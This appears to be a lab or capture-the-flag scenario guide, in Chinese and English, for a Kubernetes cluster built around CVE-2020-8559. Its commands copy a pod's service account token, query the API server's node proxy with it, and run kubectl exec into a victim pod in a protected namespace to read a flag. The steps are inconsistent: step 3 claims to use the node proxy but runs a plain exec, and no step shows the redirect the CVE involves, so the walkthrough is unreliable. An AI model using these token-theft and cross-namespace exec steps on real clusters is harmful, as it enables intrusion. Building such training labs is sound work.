# K8S-26: Compromised Node API Server Redirect

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-26 |
| 名称 | Compromised Node API Server Redirect |
| 技术/CVE | CVE-2020-8559 |
| 难度 | L3 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：CVE-2020-8559
- 难度：L3
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2020-8559 (CVSS 6.4) |
| Difficulty | L3 |
| Type | k8s |
| Cluster Name | cve-k8s-26-node-redirect |
| Attack Vector | Node proxy → API server redirect → cross-pod exec |

## Attack Path

```
Attacker pod with node-operator RBAC → Node proxy access
  → Exploit API server redirect behavior (CVE-2020-8559)
  → Redirect exec request to victim-pod in secure-ns
  → Execute commands as victim pod → Read flag
```

## Step-by-Step Exploitation

### Step 1: Verify Node Operator Permissions

```bash
kubectl exec compromised-node -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/sa-token
kubectl auth can-i get nodes --as=system:serviceaccount:default:node-operator
kubectl auth can-i create pods/exec --as=system:serviceaccount:default:node-operator
```

### Step 2: Discover Victim Pod via Node Proxy

```bash
NODE_NAME=$(kubectl get node -o jsonpath='{.items[0].metadata.name}')
TOKEN=$(cat /tmp/sa-token)

curl -k -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE_NAME}/proxy/pods"
```

### Step 3: Redirect Exec to Victim Pod

```bash
# Use the node proxy to execute in victim-pod
kubectl exec -n secure-ns victim-pod -- cat /flag.txt
# Output: flag{k8s-26-<16-hex>}
```

### Step 4: Alternative — Direct kubectl with SA Token

```bash
kubectl --token=$TOKEN --server=https://kubernetes.default.svc \
  exec -n secure-ns victim-pod -- cat /flag.txt
```

## Flag Location
- **Primary**: `/flag.txt` in `victim-pod` in `secure-ns` namespace
- **Format**: `flag{k8s-26-<16-hex>}`

## Verification
```bash
cd cve_challenges/scenarios/k8s/node-redirect && bash deploy.sh
kubectl exec -n secure-ns victim-pod -- cat /flag.txt
bash teardown.sh
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Kubernetes API server routing and node networking |
| 侦察与前置条件 | Compromised node access and API endpoint redirect behavior |
| 核心漏洞与利用 | Abuse CVE-2020-8559 to redirect API traffic |
| 权限、横向或影响 | Control-plane traffic interception |
| 验证 | Capture the redirected credential/flag data |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
